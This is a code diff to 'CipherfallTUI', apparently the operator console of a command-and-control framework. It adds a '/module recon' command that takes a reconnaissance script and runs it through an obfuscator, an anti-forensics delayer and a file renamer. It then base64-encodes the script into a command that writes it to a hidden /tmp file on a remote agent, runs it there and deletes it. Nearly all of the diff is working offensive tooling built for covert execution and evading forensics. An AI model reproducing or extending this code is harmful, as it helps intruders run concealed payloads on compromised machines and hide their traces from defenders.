@@ -17,7 +17,7 @@ Keys:
     q       quit
 """
 
-import asyncio, base64, gzip, json, os, pathlib, re, subprocess, sys, time
+import asyncio, base64, gzip, json, os, pathlib, re, shlex, shutil, subprocess, sys, tempfile, time, uuid
 from rich.markup import escape as _escape
 from rich.text import Text
 from dotenv import load_dotenv
@@ -786,6 +786,57 @@ class CipherfallTUI(App):
                        f"print((len(b)+549)//550)\"")
             else:
                 cmd = f"UPLOAD:{_download_remote}"
+        elif cmd.startswith("/module recon"):
+            parts        = cmd.split()
+            do_obfuscate = "--no-obfuscate" not in parts
+            do_delayer   = "--no-delayer"   not in parts
+            do_renamer   = "--no-renamer"   not in parts
+            pe_src   = HERE.parent / "Recon"           / "phantom_eye.sh"
+            ss_path  = HERE.parent / "Obfuscator"      / "shadowscript.sh"
+            del_path = HERE.parent / "Anti-forensics"  / "echoerase_delayer.sh"
+            ren_path = HERE.parent / "Anti-forensics"  / "echoerase_renamer.py"
+            if not pe_src.exists():
+                log.clear()
+                log.write(f"[red]not found: {pe_src}[/red]")
+                return
+            tmpdir = pathlib.Path(tempfile.mkdtemp())
+            try:
+                tmp = tmpdir / "phantom_eye.sh"
+                shutil.copy(pe_src, tmp)
+                if do_delayer:
+                    log.write("[yellow]applying echoerase_delayer…[/yellow]")
+                    r = subprocess.run(
+                        ["bash", str(del_path), str(tmp), "0.5", "0.2"],
+                        capture_output=True, text=True
+                    )
+                    delayed = tmpdir / "phantom_eye_delayed.sh"
+                    delayed.write_text(r.stdout)
+                    tmp = delayed
+                if do_obfuscate:
+                    log.write("[yellow]applying shadowscript…[/yellow]")
+                    subprocess.run(["bash", str(ss_path), str(tmp)], capture_output=True, cwd=str(tmpdir))
+                    obf = tmp.with_name(tmp.stem + "_obfv2.sh")
+                    if not obf.exists():
+                        log.write("[red]shadowscript failed — sending unobfuscated[/red]")
+                    else:
+                        tmp = obf
+                if do_renamer:
+                    log.write("[yellow]applying echoerase_renamer…[/yellow]")
+                    r = subprocess.run(
+                        ["python3", str(ren_path), "--no-recover", "--ext", str(tmp)],
+                        capture_output=True, text=True
+                    )
+                    if "→" in r.stdout:
+                        new_name = r.stdout.strip().split("→")[-1].strip()
+                        tmp = tmpdir / new_name
+                data  = tmp.read_bytes()
+                b64   = base64.b64encode(data).decode()
+                rname = f"/tmp/.{uuid.uuid4().hex[:8]}"
+                cmd   = f"echo {shlex.quote(b64)} | base64 -d > {rname} && bash {rname}; rm -f {rname}"
+                flags = ([" delayer"] if do_delayer else []) + ([" obfuscate"] if do_obfuscate else []) + ([" renamer"] if do_renamer else [])
+                log.write(f"[green]recon ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes[/green]")
+            finally:
+                shutil.rmtree(tmpdir, ignore_errors=True)
         elif cmd.startswith("/module relay"):
             parts  = cmd.split()
             a_data = self._agents_data.get(self._selected_agent or "", {})
